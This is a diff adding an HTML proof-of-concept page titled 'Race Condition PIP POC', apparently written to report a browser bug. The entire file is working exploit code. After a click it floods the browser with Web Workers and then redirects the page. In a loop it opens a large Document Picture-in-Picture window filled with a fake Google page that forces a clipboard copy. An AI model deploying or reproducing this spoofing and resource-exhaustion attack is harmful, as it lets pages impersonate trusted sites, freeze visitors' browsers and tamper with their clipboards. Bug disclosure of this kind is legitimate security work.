@@ -1,0 +1,96 @@
+<html lang="en"><head>
+   
+    
+  </head>
+
+  <body>
+    
+    <h1>Race Condition PIP POC</h1>
+  
+  
+<div  style="width:1000px" id="output" class="output">
+  <div id="content">
+<div style="width:1000px"><button  id="buyButton" style="display: inline;width:1000px">Do some Clicks</button></div>
+
+
+</div>
+
+
+    
+      <script>
+
+
+
+const payButton = document.getElementById('buyButton');
+payButton.setAttribute('style', 'display: none;width:100px;margin-left:30%');
+var g=0;
+
+
+  payButton.setAttribute('style', 'display: inline;width:100px;margin-left:30%');
+  payButton.addEventListener('click', function() {
+    if(g==0)
+    {
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       new Worker('data:application/javascript,1');
+       setInterval("new Worker('data:application/javascript,1');",1);
+      setTimeout('window.top.location.href = "https://www.google.com"',2000);
+    }
+  
+    g++;
+  });
+ 
+ 
+   const spoof = async () => {
+
+         
+            const popupPip = await documentPictureInPicture.requestWindow({
+                width: 918,
+                height: 1800
+            });
+
+
+            var p="<div onclick=\"alert(1)\" id='content'> <span style='opacity:1'><h1>FAKE GOOGLE DO click</h1></span><script>setTimeout('document.execCommand(\"copy\")',1);<\/script></div>";
+            //popupPip.document.body.append(content);
+			popupPip.document.write(p);
+        };
+  
+  
+  setInterval(spoof,1);
+
+
+</script>
+    
+  
+
+ 
+
